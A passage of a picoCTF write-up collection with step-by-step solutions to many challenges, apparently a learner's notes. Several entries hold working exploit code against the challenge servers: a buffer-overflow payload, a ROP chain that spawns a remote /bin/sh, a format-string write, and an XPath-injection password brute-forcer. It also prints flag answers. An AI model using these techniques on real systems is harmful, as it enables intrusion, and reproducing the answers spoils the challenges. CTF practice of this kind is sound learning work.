6. Look up `fls -o 360448 disk.flag.img 3981` 
```python
r/r * 2082(realloc):    flag.txt
r/r 2371:       flag.uni.txt
```
7. Grab the flag by running `icat -o 360448 disk.flag.img 2371`

### Useful Stuffs
1. https://github.com/not1cyyy/CTF-Writeups/wiki/PicoCTF-:-Sleuthkit-Apprentice

## SQL Direct
![](https://i.imgur.com/NuGkF3R.png)

### Hints
None

### Solution by steps
1. Press the 'Launch' button
![](https://i.imgur.com/xLKhRCK.png)
2. `psql -h saturn.picoctf.net -p 50505 -U postgres pico` and type in the password it gave
3. `\dt` to list the table
```python
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | flags | table | postgres
(1 row)
```
4. `SELECT * FROM flags;` to get the flag
```python
 id | firstname | lastname  |                address                 
----+-----------+-----------+----------------------------------------
  1 | Luke      | Skywalker | picoCTF{L3arN_S0m3_5qL_t0d4Y_21c94904}
  2 | Leia      | Organa    | Alderaan
  3 | Han       | Solo      | Corellia
(3 rows)
```

### Useful Stuffs
1. https://infosecwriteups.com/picoctf-2022-writeup-53633ac84ed6

## x-sixty-what
![](https://i.imgur.com/JlZkOkG.png)

### Hints
None

### Solution by steps
1. Press the link and get the hints
- Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
- Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.
![](https://i.imgur.com/siqevDs.png)
2. `wget https://artifacts.picoctf.net/c/194/vuln.c` and read the code after running `strings vuln.c`
3. `wget https://artifacts.picoctf.net/c/194/vuln`
4. `readelf -s  vuln | grep FUNC` and it returns where vuln is
```
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    49: 00000000004012b2    32 FUNC    GLOBAL DEFAULT   15 vuln
    51: 00000000004013b8     0 FUNC    GLOBAL HIDDEN    16 _fini
```
5. Run `python3 -c 'import struct; print("A"*72 + struct.pack("<I", 0x000000000040123b).decode("utf8"))'  | nc saturn.picoctf.net 63880` to get the flag

### Useful Stuffs
1. https://github.com/pmateja/picoCTF_2022_writeups/blob/main/x-sixty-what.md
2. https://github.com/gointhrushell/PicoWriteups/blob/main/binary_exploitation/200pts/x-sixty-what.pdf

## asm2
![](https://i.imgur.com/DAd27Xx.png)

### Hints
1. assembly [conditions](https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm)

### Solution by tseps
1. `wget https://jupiter.challenges.picoctf.org/static/ceac75672637589213b952abe32c84b3/test.S`
2. `vim test.S` and look at the source code
3. `vim solve.py` and write these
```python
def asm2(arg1, arg2):
# asm2:
#         <+0>:   push   ebp
#         <+1>:   mov    ebp,esp
#         <+3>:   sub    esp,0x10
#         <+6>:   mov    eax,DWORD PTR [ebp+0xc]

    eax = arg2

    #<+9>:   mov    DWORD PTR [ebp-0x4],eax
    local1 = eax

    #<+12>:  mov    eax,DWORD PTR [ebp+0x8]
    eax = arg1

    #<+15>:  mov    DWORD PTR [ebp-0x8],eax
    local2 = eax

        # <+18>:  jmp    0x50c <asm2+31>
        # <+20>:  add    DWORD PTR [ebp-0x4],0x1
        # <+24>:  add    DWORD PTR [ebp-0x8],0xd1
        # <+31>:  cmp    DWORD PTR [ebp-0x8],0x5fa1
        # <+38>:  jle    0x501 <asm2+20>
    while(local2 <= 0x5fa1):
        local1 = (local1 + 1) & 0xffffffff              #This truncates the result to 32 bits.
        local2 = (local2 + 0xd1)  & 0xffffffff    #This truncates the result to 32 bits.           
    '''
       It is necessary to truncate the restuls because in python does not have
       buffer overflow but 0x86 can have so we have to truncate it.
       '''

        # <+40>:  mov    eax,DWORD PTR [ebp-0x4]
        # <+43>:  leave
        # <+44>:  ret
    return hex(local1)

print(asm2(0x4, 0x2d))
```
4. Run `python solve.py` to get the flag

### Useful Stuffs
1. https://mregraoncyber.com/picoctf-writeup-asm2/

## m00nwalk
![](https://i.imgur.com/lqavsxS.png)

### Hints
1. How did pictures from the moon landing get sent back to Earth?
2. What is the CMU mascot?, that might help select a RX option

### Solution by steps
1. Download a SSTV decoder and decode the file 
![](https://i.imgur.com/6BlySxa.png)

### Useful Stuffs
1. http://users.belgacom.net/hamradio

## WhitePages
![Uploading file..._37t8wcjmw]()

### Hints
None

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/fa4a277cfa846e07a5981d8a19288a2e/whitepages.txt`
2. `xxd -g 1 whitepages.txt  | head` and get to know there are two kinds of spaces
3. `vim solve.py` and paste
```python
from pwn import *

with open("whitepages.txt", "rb") as bin_file:
    data = bytearray(bin_file.read())
    data = data.replace(b'\xe2\x80\x83', b'0')
    data = data.replace(b'\x20', b'1')
    data = data.decode("ascii")
    print (unbits(data))
```
4. Press esc & `:wq` to quit the mode and run `python solve.py` to get the flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/WhitePages.md

## c0rrupt
![](https://i.imgur.com/GqV6hXV.png)

### Hints
1. Try fixing the file header

### Solution by steps
1. Download the file and upload to [Hexed.it](https://hexed.it/)
2. Fix it to 
![Uploading file..._rw1mbrmn0]()
3. Download it and get your flag
*Don't forget to change the file name to png*
![Uploading file..._hs6qtd1i7]()


### Useful Stuffs
1. https://hexed.it/
2. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/c0rrupt.md

## vault-door-4
![](https://i.imgur.com/Ex587NY.png)

### Hints
1. Use a search engine to find an "ASCII table".
2. You will also need to know the difference between octal, decimal, and hexadecimal numbers.

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/c695ee23309d453a3ef369c34cc1bccb/VaultDoor4.java` and `VaultDoor4.java`
2. Copy the `byte[] myBytes = {...}` and `vim PW.java`
```java
public class PW{

     public static void main(String []args){
        byte[] myBytes = {
            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,
            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,
            0142, 0131, 0164, 063 , 0163, 0137, 070 , 0146,
            '4' , 'a' , '6' , 'c' , 'b' , 'f' , '3' , 'b' ,
        };
        String password = "";
        for(byte b : myBytes){
            password += (char)b;
        }
        System.out.println(password);
     }
}
```
2. Press `:wq` and run `javac PW.java`,`java PW` to get your key

### Useful Stuffs
1. https://itsfoss.com/run-java-program-ubuntu/

## like1000
![](https://i.imgur.com/reJDahr.png)


### Hints
1. Try and script this, it'll save you a lot of time

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/52084b5ad360b25f9af83933114324e0/1000.tar` and run `tar xvf 1000.tar`
2. But it outputs `999.tar` and `filter.txt` which doesn't have flag after catting it
3. Type this in your shell
```bash
cp 1000.tar out
cd out
for ((i = 1000; i > 0; i--)); do
    if [ ! -f "$i.tar" ]; then
        break
    fi
    tar -xvf $i.tar
    rm $i.tar
done
cd ..
```
4. At last, you'll see a file.png. Open it to get your flag

### Useful Stuffs
1. http://note.drx.tw/2008/04/command.html
2. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/like1000.md

## Guessing Game 1
![](https://i.imgur.com/q7hEpdr.png)

### Hints
1. Tools can be helpful, but you may need to look around for yourself.
2. Remember, in CTF problems, if something seems weird it probably means something...

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/dc18d0e961a348bb5a45aae1c3fe10ad/Makefile`, `wget https://jupiter.challenges.picoctf.org/static/dc18d0e961a348bb5a45aae1c3fe10ad/vuln.c`, `wget https://jupiter.challenges.picoctf.org/static/dc18d0e961a348bb5a45aae1c3fe10ad/vuln`
2. `cat Makefile` and realize that it might have buffer overflow
3. Read `vim vuln.c` and `vim sol.c`:
```c
#include <stdio.h>
#include <stdlib.h>

long get_random(){
    return rand() % 100;
}


int main()
{
    int i = 0;
    while(i < 10){
        printf("%d\n",get_random()+1);
        i++;
    }
    return 0;
}
```
4. `gcc sol.c -o sol` and `./sol` to get the random numbers
5. `chmod -x ./vuln`, `gdb ./vuln` and pass the random number in it, it asked for a name where seems to be the place to do buffer overflow
6. `ROPgadget --binary ./vuln --ropchain` and copy `p += pack('<Q', 0x0000000000475430) # add rax, 1 ; ret`s at the last output part 
7. `cat > bob` and write things you just copied
8. `wc bob` and you'll see `59  590 3245 bob`
9. `readelf -S vuln` and `vim solve.py`:
```python
#!/usr/bin/env python3

from pwn import *

def convertASCII_to_Hex(value):
      res = ""
      for i in value:
            res += hex(ord(i))[2:]
      return res

def changeEndian(value):
      length = len(value)
      res = "0x"
      for i in range(length-1, 0, -2):
            res += value[i-1]+ value[i]
      return res

def generateString(value):
      return int(changeEndian(convertASCII_to_Hex(value)), 16)

# win the game
def generatePayload():
    offset = b'a' * 120
    pop_rsi = p64(0x410ca3)                         # pop rsi ; ret
    data_address = p64(0x00000000006bc3a0)          # data address to store the /bin/sh
    pop_rax = p64(0x4163f4)                         # pop rax ; ret
    bin_syscall = p64(generateString("/bin/sh"))
    mov_rsi_rax = p64(0x47ff91)                     # mov qword ptr [rsi], rax ; ret
    pop_rdi = p64(0x400696)                         # pop rdi ; ret
    xor_rax_rax = p64(0x445950)
    pop_rdx = p64(0x44a6b5)
    syscall = p64(0x40137c)
    execv = p64(0x3b)                               # 0x3b = 59 in hexadecimal, it corresponds to the 
                                                    # identifier of the execv method
    payload = offset + pop_rax + bin_syscall + pop_rsi + data_address + mov_rsi_rax + pop_rax + p64(0x3b) + pop_rdi + data_address + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall

    return payload

def main():
    elf = ELF('vuln')                #context.binary

    remote_or_local = input("Is it local or remote?:\n1 - Local\n2 - Remote\nYour option: ")

    if(int(remote_or_local) == 1):
        p = process(elf.path)
        p.sendline(b'84')
        p.sendline(generatePayload())
        p.interactive()

    elif(int(remote_or_local) == 2):
        p = remote('jupiter.challenges.picoctf.org', 39940)
        p.sendline(b'84')
        p.sendline(generatePayload())
        time.sleep(.5)
        p.interactive()

    else:
        print("That is not a correct option, exiting")

if __name__ == "__main__":
    main()
```
10. `python solve.py`,`2` and after running `ls` you would see a flag.txt
11. `cat flag.txt` and get your flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=fAXpsO10Chs&ab_channel=MartinCarlisle
2. https://www.runoob.com/linux/linux-comm-more.html
3. https://mregraoncyber.com/picoctf-writeup-guessing-game-1/
4. https://ithelp.ithome.com.tw/articles/10193042


## Surfing the Waves
![Uploading file..._hej7nrxrg]()

### Hints
1. Music is cool, but what other kinds of waves are there?
2. Look deep below the surface

### Solution by steps
1. `wget https://mercury.picoctf.net/static/cf917a179937f814d966e53bb1fd4b90/main.wav` and run `python3`:
```bash
>>> from scipy.io import wavfile
>>> data = wavfile.read("main.wav")
>>> print(data)
# You'll see a array in here
>>> import numpy as np
>>> print(np.unique(data[1])

>>> x=[y//100 for y in data[1]]
>>> print(x)
# Too big
>>> x=[y//100//5-2 for y in data[1]]
>>> print(x)

>>> import string
>>> string.hexdigits
'0123456789abcdefABCDEF'
>>> y=[string.hexdigits[j] for j in x]
>>> print(y)
>>> z = "".join(y)
>>> print(z)

>>> bytearray.fromhex(z).decode()
# Here contains the flag
```

### Useful Stuffs
1. https://www.youtube.com/watch?v=tDPetapjm74&ab_channel=MartinCarlisle

## Stonk Market (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/N3uXSeS.png)

### Hints
None

### Solution by steps
1. It seems to pass `%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%Portfolio_LOCATION$n` to `nc mercury.picoctf.net 5654` after press `1` but my web shell died everytime when I'm running it...

*Or use this python code*
```python
from pwn import *
r=remote("mercury.picoCTF.net",5654)
payload = '%c'*10
payload += '%6299662c'
payload += '%n'
payload += '%216c'
payload += '%20$hhn'
payload += '%10504067c'
payload += '%Portfolio_LOCATION$n'

r.sendline("1")
r.sendlineafter("token?",payload)
r.interactive()
```

### Useful Stuuffs
1. https://activities.tjhsst.edu/csc/writeups/picoctf-2021-stonk-market
2. https://www.youtube.com/watch?v=gLFJFXpY44w&ab_channel=MartinCarlisle

## X marks the spot
![](https://i.imgur.com/ttsAmP5.png)

### Hints
1. XPATH

### Solution by steps
1. Press the link
![](https://i.imgur.com/v9N61Rx.png)
2. Code this in terminal to find out user id (number in front of `<!-- <strong>Title</strong> --> You&#39;re on the right path.`)
```bash
> do
>     echo $i
>     curl -s 'http://mercury.picoctf.net:20297/'  -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "name=' or //user[position()=$i]/pass[starts-with(text(),'pico')] or 'a'='+&pass=a" | grep right
> done
```
3. `vim solve.py` and write this down
```python
from pwn import *
import requests
import string
import urllib

user_id = 3 
password = ""

with log.progress('Brute-forcing password') as p:
    index = 1
    while not password.endswith("}"):
        for c in string.ascii_letters + "{}_"  + string.digits:
            p.status(f"Index: {index}, known password: '{password}', trying: '{c}'")
            r = requests.post("http://mercury.picoctf.net:20297/", data = {"name": f"' or substring(//user[position()={user_id}]/pass,{index},1)='{c}' or 'a'='", "pass": "test"})
            if "right" in r.text:
                password += c
                break
        else:
            print(f"Can't find character for index {index}!")
            break

        index += 1
        

print(f"Password: {password}")
```
4. `python solve.py` and get your flag

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/X_marks_the_spot.md

## notepad (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/FTZtgGc.png)

### Hints
None

### Solution by steps
My webshell went wrong ...

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF_redpwn/notepad.md

## college-rowing-team
![](https://i.imgur.com/3sOIBBq.png)

### Hints
None

### Solution by steps
1. `wget` all the files and look the contents
2. `vim solve.py` and paste the variable in encrypted-messages.txt
```python
#!/usr/bin/env python3
from Crypto.Util.number import inverse, long_to_bytes
from sympy import integer_nthroot

e = 3

n1 = 12426348204210593270343924563278821305386892683425418957350363905840484905896816630189546938112358425679727243103082954824537007026886458498690134225705484501535835385800730412220192564706251228021192115494699150390312107794005569764411063907390563937247515046052549753641884721864426154021041082461015103337120756347692245843318676049947569653604616584167536958803278688355036036887022591104659059883622072052793378468850702811804337808760402077376453702190206077039468600466511349923882037572540505571672225260106649075841827340894515208811788428239691505001675042096850318994923571686175381862745049100863883977473
c1 = 5065488652323342174251548936130018278628515304559137485528400780060697119682927936946069625772269234638180036633146283242714689277793018059046463458498115311853401434289264038408827377579534270489217094049453933816452196508276029690068611901872786195723358744119490651499187556193711866091991489262948739533990000464588752544599393

n2 = 19928073532667002674271126242460424264678302463110874370548818138542019092428748404842979311103440183470341730391245820461360581989271804887458051852613435204857098017249255006951581790650329570721461311276897625064269097611296994752278236116594018565111511706468113995740555227723579333780825133947488456834006391113674719045468317242000478209048237262125983164844808938206933531765230386987211125968246026721916610034981306385276396371953013685639581894384852327010462345466019070637326891690322855254242653309376909918630162231006323084408189767751387637751885504520154800908122596020421247199812233589471220112129
c2 = 86893891006724995283854813014390877172735163869036169496565461737741926829273252426484138905500712279566881578262823696620415864916590651557711035982810690227377784525466265776922625254135896966472905776613722370871107640819140591627040592402867504449339363559108090452141753194477174987394954897424151839006206598186417617292433784471465084923195909989

n3 = 13985338100073848499962346750699011512326742990711979583786294844886470425669389469764474043289963969088280475141324734604981276497038537100708836322845411656572006418427866013918729379798636491260028396348617844015862841979175195453570117422353716544166507768864242921758225721278003979256590348823935697123804897560450268775282548700587951487598672539626282196784513553910086002350034101793371250490240347953205377022300063974640289625028728548078378424148385027286992809999596692826238954331923568004396053037776447946561133762767800447991022277806874834150264326754308297071271019402461938938062378926442519736239
c3 = 86893891006724995283854813014390877172735163869036169496565461737741926829273252426484138905500712279566881578262823696620415864916590651557711035982810690227377784525466265776922625254135896966472905776613722370871107640819140591627040592402867504449339363559108090452141753194477174987394954897424151839006206598186417617292433784471465084923195909989

n4 = 19594695114938628314229388830603768544844132388459850777761001630275366893884362012318651705573995962720323983057152055387059580452986042765567426880931775302981922724052340073927578619711314305880220746467095847890382386552455126586101506301413099830377279091457182155755872971840333906012240683526684419808580343325425793078160255607072901213979561554799496270708954359438916048029174155327818898336335540262711330304350220907460431976899556849537752397478305745520053275803008830388002531739866400985634978857874446527750647566158509254171939570515941307939440401043123899494711660946335200589223377770449028735883
c4 = 5065488652323342174251548936130018278628515304559137485528400780060697119682927936946069625772269234638180036633146283242714689277793018059046463458498115311853401434289264038408827377579534270489217094049453933816452196508276029690068611901872786195723358744119490651499187556193711866091991489262948739533990000464588752544599393

n5 = 12091176521446155371204073404889525876314588332922377487429571547758084816238235861014745356614376156383931349803571788181930149440902327788407963355833344633600023056350033929156610144317430277928585033022575359124565125831690297194603671159111264262415101279175084559556136660680378784536991429981314493539364539693532779328875047664128106745970757842693549568630897393185902686036462324740537748985174226434204877493901859632719320905214814513984041502139355907636120026375145132423688329342458126031078786420472123904754125728860419063694343614392723677636114665080333174626159191829467627600232520864728015961207
c5 = 301927034179130315172951479434750678833634853032331571873622664841337454556713005601858152523700291841415874274186191308636935232309742600657257783870282807784519336918511713958804608229440141151963841588389502276162366733982719267670094167338480873020791643860930493832853048467543729024717103511475500012196697609001154401

n6 = 19121666910896626046955740146145445167107966318588247850703213187413786998275793199086039214034176975548304646377239346659251146907978120368785564098586810434787236158559918254406674657325596697756783544837638305550511428490013226728316473496958326626971971356583273462837171624519736741863228128961806679762818157523548909347743452236866043900099524145710863666750741485246383193807923839936945961137020344124667295617255208668901346925121844295216273758788088883216826744526129511322932544118330627352733356335573936803659208844366689011709371897472708945066317041109550737511825722041213430818433084278617562166603
c6 = 38999477927573480744724357594313956376612559501982863881503907194813646795174312444340693051072410232762895994061399222849450325021561935979706475527169503326744567478138877010606365500800690273

n7 = 13418736740762596973104019538568029846047274590543735090579226390035444037972048475994990493901009703925021840496230977791241064367082248745077884860140229573097744846674464511874248586781278724368902508880232550363196125332007334060198960815141256160428342285352881398476991478501510315021684774636980366078533981139486237599681094475934234215605394201283718335229148367719703118256598858595776777681347337593280391052515991784851827621657319164805164988688658013761897959597961647960373018373955633439309271548748272976729429847477342667875183958981069315601906664672096776841682438185369260273501519542893405128843
c7 = 38999477927573480744724357594313956376612559501982863881503907194813646795174312444340693051072410232762895994061399222849450325021561935979706475527169503326744567478138877010606365500800690273

n8 = 11464859840071386874187998795181332312728074122716799062981080421188915868236220735190397594058648588181928124991332518259177909372407829352545954794824083851124711687829216475448282589408362385114764290346196664002188337713751542277587753067638161636766297892811393667196988094100002752743054021009539962054210885806506140497869746682404059274443570436700825435628817817426475943873865847012459799284263343211713809567841907491474908123827229392305117614651611218712810815944801398564599148842933378612548977451706147596637225675719651726550873391280782279097513569748332831819616926344025355682272270297510077861213
c8 = 38999477927573480744724357594313956376612559501982863881503907194813646795174312444340693051072410232762895994061399222849450325021561935979706475527169503326744567478138877010606365500800690273

n9 = 21079224330416020275858215994125438409920350750828528428653429418050688406373438072692061033602698683604056177670991486330201941071320198633550189417515090152728909334196025991131427459901311579710493651699048138078456234816053539436726503461851093677741327645208285078711019158565296646858341000160387962592778531522953839934806024839570625179579537606629110275080930433458691144426869886809362780063401674963129711723354189327628731665487157177939180982782708601880309816267314061257447780050575935843160596133370063252618488779123249496279022306973156821343257109347328064771311662968182821013519854248157720756807
c9 = 301927034179130315172951479434750678833634853032331571873622664841337454556713005601858152523700291841415874274186191308636935232309742600657257783870282807784519336918511713958804608229440141151963841588389502276162366733982719267670094167338480873020791643860930493832853048467543729024717103511475500012196697609001154401

n10 = 22748076750931308662769068253035543469890821090685595609386711982925559973042348231161108618506912807763679729371432513862439311860465982816329852242689917043600909866228033526990181831690460395726449921264612636634984917361596257010708960150801970337017805161196692131098507198455206977607347463663083559561805065823088182032466514286002822511854823747204286303638719961067031142962653536148315879123067183501832837303731109779836127520626791254669462630052241934836308543513534520718206756591694480011760892620054163997231711364648699030108110266218981661196887739673466188945869132403569916138510676165684240183111
c10 = 5065488652323342174251548936130018278628515304559137485528400780060697119682927936946069625772269234638180036633146283242714689277793018059046463458498115311853401434289264038408827377579534270489217094049453933816452196508276029690068611901872786195723358744119490651499187556193711866091991489262948739533990000464588752544599393

n11 = 15211900116336803732344592760922834443004765970450412208051966274826597749339532765578227573197330047059803101270880541680131550958687802954888961705393956657868884907645785512376642155308131397402701603803647441382916842882492267325851662873923175266777876985133649576647380094088801184772276271073029416994360658165050186847216039014659638983362906789271549086709185037174653379771757424215077386429302561993072709052028024252377809234900540361220738390360903961813364846209443618751828783578017709045913739617558501570814103979018207946181754875575107735276643521299439085628980402142940293152962612204167653199743
c11 = 301927034179130315172951479434750678833634853032331571873622664841337454556713005601858152523700291841415874274186191308636935232309742600657257783870282807784519336918511713958804608229440141151963841588389502276162366733982719267670094167338480873020791643860930493832853048467543729024717103511475500012196697609001154401

n12 = 21920948973299458738045404295160882862610665825700737053514340871547874723791019039542757481917797517039141169591479170760066013081713286922088845787806782581624491712703646267369882590955000373469325726427872935253365913397944180186654880845126957303205539301069768887632145154046359203259250404468218889221182463744409114758635646234714383982460599605335789047488578641238793390948534816976338377433533003184622991479234157434691635609833437336353417201442828968447500119160169653140572098207587349003837774078136718264889636544528530809416097955593693611757015411563969513158773239516267786736491123281163075118193
c12 = 86893891006724995283854813014390877172735163869036169496565461737741926829273252426484138905500712279566881578262823696620415864916590651557711035982810690227377784525466265776922625254135896966472905776613722370871107640819140591627040592402867504449339363559108090452141753194477174987394954897424151839006206598186417617292433784471465084923195909989

#--------RSA--------#

ciphertexts = {c1:n1, c2:n2, c3:n3, c4:n4, c5:n5, c6:n6, c7:n7, c8:n8, c9:n9, c10:n10, c11:n11, c12:n12}

for c in ciphertexts:
    while True:
        # Example: integer_nthroot(16, 2) => (4, True)
        # Note that the True or False here is boolean value
        result = integer_nthroot(c, 3)
        if result[1]:
            m = result[0]
            break
        c += ciphertexts[c]

    plaintext = long_to_bytes(m).decode()
    print(plaintext)
```

### Useful Stuffs
1. https://www.ctfwriteup.com/picoctf/picomini-by-redpwn/cryptography

## fermat-strings
![](https://i.imgur.com/8ifOtff.png)

### Hints
None

### Solution by steps
Web shell in picoCTF can't install pwninit... and lots of useful tools

### Useful Stuffs
1. https://heinen.dev/picoctf-2021-redpwn/
2. https://activities.tjhsst.edu/csc/writeups/picomini-redpwn-darin

## droid
![](https://i.imgur.com/wkqjYZV.png)

### Hints
1. Try using an emulator or device
2. https://developer.android.com/studio

### Solution by steps
I can't any VM or my laptop will die...

### Useful Stuffs
1. https://picoctf2019.haydenhousen.com/reverse-engineering/droids0
    
## mus1c
![](https://i.imgur.com/wVS03yf.png)

### Hints
1. Do you think you can master rockstar?

### Solution by steps
1. Download the file and copy the text in it
2. Paste them to [ROCKSTAR](https://codewithrockstar.com/online) and press 'ROCK!'
![](https://i.imgur.com/3bLAb2X.png)
3. Copy the output and paste it to [ASCII to Text](https://www.browserling.com/tools/ascii-to-text)
4. Get your flag after hitting 'Convert to string' button

### Useful Stuffs
1. https://codewithrockstar.com/online
2. https://www.browserling.com/tools/ascii-to-text

## m00nwalk2
![](https://i.imgur.com/zowQIlw.png)

### Hints
1. Use the clues to extract the another flag from the .wav file

### Solution by steps
1. `wget` all the files and do the same as m00nwalk1 does
2. Search `Alan Eliasen the Future Boy` and the second URL might brought you to [here](https://futureboy.us/stegano/)
3. `steghide extract -sf message.wav -p hidden_stegosaurus` and `cat steganopayload12154.txt`

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/m00nwalk2.md
